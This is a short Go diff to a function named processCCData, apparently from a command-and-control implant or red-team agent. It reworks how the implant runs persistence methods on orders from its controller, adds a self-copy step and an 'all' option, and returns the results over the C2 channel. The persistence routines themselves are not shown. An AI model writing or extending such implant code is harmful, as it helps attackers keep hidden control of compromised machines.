@@ -134,18 +134,17 @@ func processCCData(data *MsgTunData) {
 			if len(cmdSlice) != 2 {
 				return
 			}
-
-			for key, method := range PersistMethods {
-				if cmdSlice[1] == key {
-					err = method()
-					out = fmt.Sprintf("Success: %s", key)
-					if err != nil {
-						out = fmt.Sprintf("Error: %v", err)
-					}
-				}
-			}
-			if out == "" {
+			SelfCopy()
+			if cmdSlice[1] == "all" {
+				err = PersistAllInOne()
+				out = fmt.Sprintf("Result: %v", err)
+			} else {
 				out = "No such method available"
+				if method, exists := PersistMethods[cmdSlice[1]]; exists {
+					err = method()
+					out = fmt.Sprintf("Result: %v", err)
+					log.Println(out)
+				}
 			}
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
